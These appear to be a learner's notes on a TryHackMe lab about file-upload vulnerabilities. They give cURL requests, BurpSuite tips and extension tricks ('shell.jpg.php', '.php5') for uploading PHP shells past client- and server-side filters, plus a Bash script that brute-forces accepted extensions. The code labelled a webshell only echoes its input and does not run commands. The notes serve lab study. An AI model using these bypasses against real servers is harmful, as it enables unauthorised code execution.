# Upload vulnerabilities

{% embed url="https://tryhackme.com/room/uploadvulns" %}
TryHackMe upload vulnerabilities practice room
{% endembed %}

### Bypassing client-side filtering

1. Direct server requests with _cURL_

_Eg._

> Task 7 of the _tryhackme.com_ practice room (link provided at the top)

The following Javascript file defines the client-side filtering logic, which only allows file uploads of the type `image/png`:

```javascript
...
...
		if (file.type != "image/png"){
			upload.value = "";
			uploadMsg.style = "display:none;";
			error();
		} else{
			uploadMsg.innerHTML = "Chosen File: " + upload.value.split(/(\\|\/)/g).pop();
			responseMsg.style="display:none;";
			errorMsg.style="display:none;";
			success();
		}

...
...
```

Given the following form field in the HTML source code:

```html
<form method="post" enctype="multipart/form-data">
    <input type="file" name="fileToUpload" id="fileSelect" style="display:none">
    <input class="Btn" type="submit" value="Upload" name="submit" id="submitBtn">
</form>
```

A cURL request can be sent directly to the server — completely bypassing the client-side filter.

The `-F` or `--form` flag in the _cURL_ command can be used to send form-data (given that the file `shell.php` is found in the same directory):

```bash
curl 'http://java.uploadvulns.thm/' \
  -H 'Host: java.uploadvulns.thm' \
  -F 'fileToUpload=@shell.php;type=text/x-php'
  -F 'submit=Upload'
```

The Content-Type header will be automatically added to the final  HTTP _POST_ request, and will look like the following:

```http
Content-Type: multipart/form-data; boundary=------------------------xxxx
```



2. Interceping and modifying requests with _BurpSuite_

_BurpSuite_ can be used to modify:

a) The GET response from the server to the client, allowing the removal of JavaScript filter logic loaded on the client side&#x20;

b) The POST request sent to the server, enabling the removal of client-side filtering before the data is uploaded



### Bypassing server-side filtering

1. Presence of valid file extension anywhere within the filename (_whitelist bypass_)

Some server-side filtering mechanism check if the filename contains a valid file extension without enforcing strict validation at the end of the filenam. This logic can be exploited by including the allowed extension within the filename while using a malicious extension.

A possible server-side logic:

```php
IF STRING ".[file-ext]" IS IN VARIABLE <user_input>:
    PROCEED
ELSE:
    RETURN ERROR MESSAGE
```

Eg. Given that the valid file extension is `.jpg`. A possible valid filename can be: `shell.jpg.php`. This allows us to bypass the filter and upload a PHP file — providing us a platform for code execution..



2. Using uncommon file extension for the same file-type (_blacklist bypass_)

Some server-side filtering logic may check the file extension, and reject the file based on a blacklist. However, blacklist implementations are often incomplete, and fail to cover all possible extensions for the same file-type. This allows us to sneak a filename through the filters, which may be recognized and executed by the server.

Refer to the sub-page named: _**File extension cheat-sheet**_.

Eg. Given that `.php` is blacklisted, `.php5` may still be allowed. Thus, the filename `shell.php5` will be accepted by the server, and may execute if configured to handle `.php5` files as PHP scripts — providing us a platform for code execution.



### Examples

Eg.

> Task 8 of the _tryhackme.com_ practice room (link provided at the top)

This challenge requires the combination of method 1 and 2 discussed above (\*\*TO CONFIRM).

I decided to create a simple Bash shell script to automate the process of finding the valid filename.

_**php-ext.txt**_ (wordlist of PHP file extensions)

```
.phtml
.php3
.php4
.php5
.php7
.phps
.php-s
.pht
.phar
```

_**Bash shell script**_

```sh
#!/bin/bash

file="php-ext.txt"
while IFS="" read -r cur;
do
	if [[ -z "$cur" ]]; then
		continue
	fi

	res=$(curl http://annex.uploadvulns.thm -H "Host: annex.uploadvulns.thm" -F "fileToUpload=@shell.jpg$cur;type=application/octet-stream" -F "submit=Upload" -s -o /dev/null -D - | grep 'location')

	# alternatively,
	# if [[ "$res" == *"/?submit=success"* ]]; then
	if echo "$res" | grep -q "/?submit=success"; then
		printf "FOUND: $cur"
		exit 0
	fi

done < "$file"
```

Output: `FOUND: .php5`

The accepted PHP shell script filename is `shell.jpg.php5`.



Simple webshell (to transfer to a dedicated _**WEBSHELL**_ section?)

```php
<?php
// Check if 'cmd' parameter is set in the URL
if (isset($_GET['cmd'])) {
    // Get the value of 'cmd' parameter
    $cmd = $_GET['cmd'];

    // Display the value
    echo "Command: " . htmlspecialchars($cmd);
} else {
    echo "No command provided.";
}
?>
```
